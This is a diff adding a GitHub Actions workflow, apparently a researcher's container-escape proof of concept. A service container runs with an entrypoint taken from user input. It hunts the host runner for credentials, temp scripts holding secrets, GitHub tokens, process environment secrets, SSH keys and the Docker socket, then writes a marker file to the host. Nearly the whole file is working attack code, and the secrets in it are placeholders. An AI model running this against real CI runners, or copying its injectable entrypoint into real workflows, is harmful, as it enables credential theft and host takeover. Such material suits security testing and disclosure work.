@@ -1,0 +1,106 @@
+name: "Test 12: Maximum impact assessment"
+on:
+  workflow_dispatch:
+    inputs:
+      entrypoint:
+        description: "Entrypoint"
+        required: false
+        default: "/bin/sh"
+env:
+  FAKE_DB_PASSWORD: "super_secret_db_pass_123"
+  FAKE_API_KEY: "sk-fake-api-key-for-testing-12345"
+jobs:
+  victim-job:
+    runs-on: ubuntu-latest
+    env:
+      JOB_SECRET: "job_level_secret_456"
+    services:
+      attacker:
+        image: alpine:3.19
+        entrypoint: ${{ github.event.inputs.entrypoint }}
+        command: >-
+          -c "
+          apk add --no-cache jq curl 2>/dev/null;
+
+          echo '##############################';
+          echo '# CONTAINER ESCAPE PoC v2    #';
+          echo '##############################';
+
+          echo;
+          echo '=== 1. RUNNER CREDENTIALS ===';
+          cat /host/home/runner/.credentials 2>&1 | head -5;
+          cat /host/home/runner/.runner 2>&1 | head -10;
+
+          echo;
+          echo '=== 2. GITHUB ACTIONS TEMP (secrets land here) ===';
+          ls -la /host/home/runner/work/_temp/ 2>&1 | head -15;
+          echo '--- Script files (contain secrets as env exports) ---';
+          find /host/home/runner/work/_temp -name '*.sh' 2>/dev/null | head -5;
+          for f in $(find /host/home/runner/work/_temp -name '*.sh' 2>/dev/null | head -3); do
+            echo \"--- Content of \$f ---\";
+            cat \"\$f\" 2>&1 | head -20;
+          done;
+
+          echo;
+          echo '=== 3. GITHUB_TOKEN HUNT ===';
+          grep -r 'GITHUB_TOKEN\|ghp_\|gho_\|github_pat' /host/home/runner/work/_temp/ 2>/dev/null | head -5;
+          grep -r 'GITHUB_TOKEN\|ghp_\|gho_\|github_pat' /host/home/runner/work/_runner/ 2>/dev/null | head -5;
+
+          echo;
+          echo '=== 4. DOCKER SOCKET (full host control) ===';
+          ls -la /host/var/run/docker.sock 2>&1;
+          echo '--- Can we use it? ---';
+          curl -s --unix-socket /host/var/run/docker.sock http://localhost/containers/json 2>&1 | head -3;
+
+          echo;
+          echo '=== 5. HOST PROCESSES ===';
+          ls -la /host/proc/1/cmdline 2>&1;
+          cat /host/proc/1/cmdline 2>&1 | tr '\0' ' ';
+          echo;
+
+          echo;
+          echo '=== 6. ENVIRONMENT VARIABLES OF RUNNER PROCESS ===';
+          cat /host/proc/1/environ 2>&1 | tr '\0' '\n' | grep -i 'token\|secret\|key\|pass\|github' | head -10;
+
+          echo;
+          echo '=== 7. WRITE TEST (can we persist on host?) ===';
+          echo 'ATTACKER_WAS_HERE' > /host/tmp/escape_proof.txt 2>&1 && echo 'WRITE SUCCESS' || echo 'WRITE FAILED';
+          cat /host/tmp/escape_proof.txt 2>&1;
+
+          echo;
+          echo '=== 8. NETWORK INTERFACES (host network visible?) ===';
+          cat /host/proc/net/tcp 2>&1 | head -5;
+
+          echo;
+          echo '=== 9. SSH KEYS ===';
+          ls -la /host/home/runner/.ssh/ 2>&1 | head -5;
+          ls -la /host/root/.ssh/ 2>&1 | head -5;
+
+          echo;
+          echo '=== 10. DISK DEVICES (direct disk access) ===';
+          fdisk -l /dev/sda 2>&1 | head -5;
+
+          echo;
+          echo '=== ASSESSMENT COMPLETE ===';
+          sleep 60
+          "
+    steps:
+      - name: Wait for assessment
+        run: sleep 20
+
+      - name: Collect results
+        run: |
+          for CID in $(docker ps -aq); do
+            echo "##############################"
+            echo "# ESCAPE ASSESSMENT RESULTS  #"
+            echo "##############################"
+            docker logs "$CID" 2>&1
+            echo ""
+            echo "=== CONTAINER CONFIG ==="
+            docker inspect "$CID" --format 'Privileged={{.HostConfig.Privileged}} Binds={{.HostConfig.Binds}} PidMode={{.HostConfig.PidMode}}' 2>&1
+          done
+
+      - name: Verify host write
+        run: |
+          echo "=== Checking if attacker wrote to host ==="
+          cat /tmp/escape_proof.txt 2>&1 || echo "File not found"
